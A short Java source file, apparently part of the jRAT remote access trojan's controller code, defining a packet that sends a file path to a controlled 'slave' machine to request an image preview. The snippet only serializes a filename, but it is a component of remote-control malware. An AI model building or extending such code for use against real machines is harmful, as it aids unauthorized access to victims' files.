package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;


public class Packet62PreviewImage extends AbstractOutgoingPacket {

	private String file;

	public Packet62PreviewImage(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 62;
	}

}
